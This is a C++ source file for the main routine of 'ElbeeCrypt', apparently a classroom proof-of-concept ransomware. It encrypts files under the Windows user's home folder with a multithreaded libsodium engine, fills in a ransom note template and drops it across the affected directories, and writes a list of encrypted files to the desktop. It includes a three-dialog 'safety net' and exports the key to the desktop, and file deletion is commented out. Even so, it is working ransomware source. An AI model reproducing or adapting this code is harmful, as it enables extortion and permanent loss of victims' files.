//C++ std dependencies
#include <fstream>
#include <iostream>
#include <map>
#include <regex>

//3rd-party dependencies
#include "thread-pool/BS_thread_pool.hpp"

//Common dependencies
#include "elbeecrypt/common/settings.hpp"
#include "elbeecrypt/common/targets/extensions.hpp"
#include "elbeecrypt/common/utils/fs.hpp"
#include "elbeecrypt/common/utils/stream.hpp"
#include "elbeecrypt/common/utils/string.hpp"
#include "elbeecrypt/common/utils/threadsafe_cout.hpp"

//Cryptor dependencies
#include "elbeecrypt/cryptor/hunter-encryptor.hpp"
#include "elbeecrypt/cryptor/main.hpp"

//Resource files
#include "resources/cryptor/recover-your-files.hxx.res"

//Platform-specific includes
#if defined(_WIN32) || defined(__WIN32__) || defined(WIN32)
	//Definitions
	#define WINDOWS_PLATFORM
	#define WIN32_LEAN_AND_MEAN
	#include <windows.h>
#else
	#error "This code is only meant to be compiled for Windows targets. Either cross-compile or build natively on Win-32."
#endif

//Namespace definitions
using namespace elbeecrypt;


/** 
 * Main entrypoint for ElbeeCrypt's cryptor binary.
 */
int main(){
	//Deploy the safety net before continuing
	if(common::Settings::SAFETY_NET == true){
		if(!cryptor::Main::safetyNet()) exit(-1);
	}

	//Set the root directories
	const fs::path homeFolder("C:\\Users\\" + std::string(getenv("username")));
	std::cout << "Base path: " << homeFolder << std::endl;

	//Initialize the cryptor engine
	common::io::CryptorEngine cryptorEngine(common::Settings::CRYPTO_CHUNK_SIZE);
	std::cout << "LibSodium Init: " << sodium_init() << std::endl;

	//Encrypt files
	std::vector<fs::path> roots = {homeFolder};
	std::cout << "Encryption routines started!" << std::endl;
	std::vector<fs::path> successfullyEncrypted = cryptor::Main::encrypt(homeFolder, roots, cryptorEngine);

	//If nothing was encrypted, simply exit
	if(successfullyEncrypted.size() < 1) return -1;

	//Get the parent paths of the encrypted files
	std::vector<fs::path> parentPaths = common::utils::FS::getParents(successfullyEncrypted);

	//Drop ransom notes
	std::vector<fs::path> ransomNoteLocations;
	if(common::Settings::SPAM_RANSOM_NOTES) ransomNoteLocations = parentPaths;
	else ransomNoteLocations = {homeFolder / "Desktop"};
	cryptor::Main::dropRansomNote(ransomNoteLocations, cryptorEngine, roots, successfullyEncrypted, homeFolder / "Desktop");
	std::cout << "Generated ransom note. Check your desktop." << std::endl;

	//Write the list of encrypted files to the user's desktop
	common::utils::Stream::writeToFile(homeFolder / "Desktop" / common::Settings::ENCRYPTED_FILES_LIST_NAME, successfullyEncrypted);

	//Final words
	std::cout << std::endl << "Your files have been encrypted! Have a secure day :)" << std::endl;
	return 0;
}

/** Impl of dropRansomNote(vector<path>, CryptorEngine, vector<path>, vector<path>, path). */
void cryptor::Main::dropRansomNote(
	const std::vector<fs::path>& targets, common::io::CryptorEngine& cEngine,
	const std::vector<fs::path>& roots, const std::vector<fs::path>& encrypted,
	const fs::path& homeFolderDesktop
){
	//Load the ransom note buffer from the file
	bin2cpp::RecoveryourfilesTxtFile ransomNoteObj = bin2cpp::RecoveryourfilesTxtFile();

	//Get the contents of the ransom note as a string
	std::string ransomNote = std::string(ransomNoteObj.getBuffer());

	//Do placeholder replacement ({fmt} does not want to cooperate)
	std::string ransomNoteFormatted = std::regex_replace(ransomNote, std::regex("%encryption_scheme%"), common::io::CryptorEngine::CIPHER_ALGO);
	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%keypair_type%"), common::io::CryptorEngine::KEY_TYPE);
	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%key_fingerprint%"), cEngine.keyFingerprint());
	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%chunk_size%"), std::to_string(cEngine.getChunkSize()));
	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%target_extensions%"), common::utils::Container::vecStr(common::targets::Extensions::encryptable));
	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%root_directories%"), common::utils::Container::vecPathStr(roots));
	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%encrypted_extension%"), common::Settings::ENCRYPTED_EXTENSION);
	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%encrypted_filelist_location%"), (homeFolderDesktop / common::Settings::ENCRYPTED_FILES_LIST_NAME).string());
	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%total_encrypted%"), std::to_string(encrypted.size()));
	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%spam_ransom_note%"), common::utils::String::boolStr(common::Settings::SPAM_RANSOM_NOTES));
	ransomNoteFormatted = std::regex_replace(ransomNoteFormatted, std::regex("%safety_net_enabled%"), common::utils::String::boolStr(common::Settings::SAFETY_NET));

	//Loop over the target path list
	for(fs::path target : targets){
		//Open the target, write the ransom note, and close the file in one fell swoop
		common::utils::Stream::writeToFile((target / common::Settings::RANSOM_NOTE_NAME), ransomNoteFormatted);
	}
}

/** Impl of encrypt(path, vector<path>, CryptorEngine). */ //TODO: move the cryptor engine creation to main()
std::vector<fs::path> cryptor::Main::encrypt(const fs::path& homeFolder, const std::vector<fs::path>& roots, common::io::CryptorEngine& cryptorEngine){
	//Get the list of targets to encrypt
	cryptor::HunterEncryptor hunter(roots);

	//Check if there's at least one target to encrypt before proceeding
	if(hunter.getTargets().size() < 1){
		std::cout << "Nothing to encrypt :(" << std::endl;
		return hunter.getTargets();
	}

	//Drop the encryption key to the desktop
	std::string keyName = std::regex_replace(common::Settings::ENCRYPTION_KEY_NAME, std::regex("%keyFingerprint%"), cryptorEngine.keyFingerprint());
	fs::path encryptionKeyPath = homeFolder / "Desktop" / keyName;
	cryptorEngine.exportKey(encryptionKeyPath);

	//Shard the targets vector x ways
	std::map<uint32_t, std::vector<fs::path>> shards = common::utils::Container::shardVector(hunter.getTargets(), common::Settings::ENCRYPTION_THREADS);

	//Create vectors to store the lists of successfully and unsuccessfully encrypted files
	std::vector<fs::path> successfullyEncrypted = {};
	std::vector<fs::path> failedEncrypted = {};

	//Create a thread pool for file encryption
	BS::thread_pool pool(common::Settings::ENCRYPTION_THREADS);

	//Create the encryptor lambda
	auto encryptor = [&cryptorEngine, &successfullyEncrypted, &failedEncrypted](const std::vector<fs::path>& targets){
		//Loop over the targets
		for(fs::path target : targets){
			//Create the path in which the target encrypted file will be dropped
			fs::path encryptedOut = common::utils::FS::appendExt(target, common::Settings::ENCRYPTED_EXTENSION);

			//Encrypt the file with the cryptor engine
			common::io::CryptorEngine::Status encryptionResult = cryptorEngine.encryptFile(target, encryptedOut);

			//Delete the file at the given path
			//fs::remove(target);

			//Add the path to the appropriate vector depending on the result
			encryptionResult == common::io::CryptorEngine::Status::OK ?
				successfullyEncrypted.push_back(target) :
				failedEncrypted.push_back(target);
		}
	};

	//Create x threads to encrypt the files
	for(size_t i = 0; i < shards.size(); i++){
		//Spawn a thread to encrypt the current shard of file paths
		pool.push_task(encryptor, shards.at(i));
		common::utils::Cout{} << "Pushed shard #" << (i + 1) << " for processing. Shard contains " << shards.at(i).size() << " paths..." << std::endl;
	}

	//Wait on the treads to complete before going on
	pool.wait_for_tasks();
	common::utils::Cout{} << "Encrypted " << successfullyEncrypted.size() << " files" << std::endl;
	common::utils::Cout{} << "Failed to encrypt " << failedEncrypted.size() << " files" << std::endl;

	//Return the list of successfully encrypted files
	return successfullyEncrypted;
}

/** Impl of safetyNet(). */
bool cryptor::Main::safetyNet(){
	//First prompt with info about the program
	int promptOne = MessageBox(
		NULL,
		"Welcome to ElbeeCrypt: A PoC file-encrypting ransomware for CECS-378. \n\nMade by Josh, Jaxon, Valeria, Nathanael, David, Alvin, and Robin \n\nWARNING: This is a live file encrypting ransomware. While this sample doesn't destroy encryption keys like other ransomware, things can go haywire if the keys are lost or damaged or you delete the encrypted files. We are not responsible for any damage to your files or system. DO NOT PROCEED UNLESS YOU ARE OKAY WITH PERMANENT DAMAGE TO YOUR FILES. \n\nIf you are okay to proceed, press the \"OK\" button.",
		"ElbeeCrypt",
		MB_ICONASTERISK | MB_OKCANCEL | MB_DEFBUTTON2
	);
	if(promptOne == IDCANCEL) return false; //Gate one

	//Second prompt with further warning
	int promptTwo = MessageBox(
		NULL,
		"This ransomware sample, like other ransomware, CAN DESTROY YOUR PERSONAL FILES PERMANENTLY. Unless configured otherwise, this sample will recursively hunt out EVERY TARGET file in \"C:\\Users\\\", meaning any file in that directory that matches the target extension list WILL BE ENCRYPTED! \n\nIf you are okay to proceed, press the \"OK\" button.",
		"ElbeeCrypt",
		MB_ICONWARNING | MB_OKCANCEL | MB_DEFBUTTON2
	);
	if(promptTwo == IDCANCEL) return false; //Gate two

	//Third prompt with a final warning
	int promptThree = MessageBox(
		NULL,
		"LAST WARNING: THIS SAMPLE CAN DESTROY YOUR FILES!!!!!! As stated previously THE AUTHORS HOLD NO RESPONSIBILITY IF THIS OCCURS. \n\nIf you are okay to proceed, press the \"OK\" button.",
		"ElbeeCrypt",
		MB_ICONERROR | MB_OKCANCEL | MB_DEFBUTTON2
	);
	if(promptThree == IDCANCEL) return false; //Gate three

	//No cancellations, so return true be default
	return true;
}
